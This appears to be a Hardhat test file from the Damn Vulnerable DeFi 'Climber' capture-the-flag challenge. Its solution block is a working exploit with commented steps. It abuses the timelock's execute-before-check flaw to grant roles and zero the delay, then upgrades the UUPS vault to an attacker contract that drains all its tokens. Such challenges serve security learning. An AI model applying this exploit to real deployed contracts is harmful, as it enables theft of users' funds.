const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');


describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
        
        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // Deploy our HackClimber contract
        hackClimber = await (await ethers.getContractFactory('HackClimber', player)).deploy(
            timelock.address,
            vault.address,
        );
        
        // Create the five interfaces we're going to use
        const iface = new ethers.utils.Interface([
            "function grantRole(bytes32 role, address account)",
            "function updateDelay(uint64 newDelay)",
            "function scheduleHack()",
            "function upgradeToAndCall(address newImplementation, bytes memory data)",
            "function hack(address token, address player)"
        ]);

        // We're going to encode several function that are going to be called from the ClimberTimelock
        // We're taking advantage that the ClimberTimelock contract first execute the functions
        // And only after verify if it's time to execute them
        // The owner of the ClimberTimelock contract can grant any role to anyone
        // We're granting the PROPOSER_ROLE to our contract
        const grantRoleData = iface.encodeFunctionData("grantRole", [
            "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
            hackClimber.address,
        ]);
        // Next we're going to update the delay from 15 days to 0 seconds
        const updateDelayData = iface.encodeFunctionData("updateDelay", [0]);
        // Next we're going to call our contract to schedule the execute action we're executing rightn now
        // So when the execution of the four functions we're passing as data finished
        // The operation will be mark as ReadyForExecution
        const scheduleHackData = iface.encodeFunctionData("scheduleHack");
        
        // Finnaly we're going to take advantage that the ClimberVault is UUPSUpgradeable
        // Because it's an UUPSUpgradeable we can update the implementation contract
        // So we're setting our HackClimber as the implementation contract
        // Using the upgradeToAndCall function for that
        // And then calling the hack function from our contract with delegate call
        // Out function transfer all token from the vault to us
        const nestedCall = iface.encodeFunctionData("hack", [token.address, player.address]);
        const setImplementationData = iface.encodeFunctionData("upgradeToAndCall", [
            hackClimber.address,
            nestedCall,
        ]);

        // We're setting the data and the salt into our contract
        // Otherwise we can encode the data to schedule
        await hackClimber.setData(
            [grantRoleData, updateDelayData, scheduleHackData, setImplementationData],
            ethers.utils.formatBytes32String("salt")
        );

        // Finnaly we're calling the execute function to finish the hack
        await timelock.connect(player).execute(
            [timelock.address, timelock.address, hackClimber.address, vault.address],
            [0, 0, 0, 0],
            [grantRoleData, updateDelayData, scheduleHackData, setImplementationData],
            ethers.utils.formatBytes32String("salt")
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
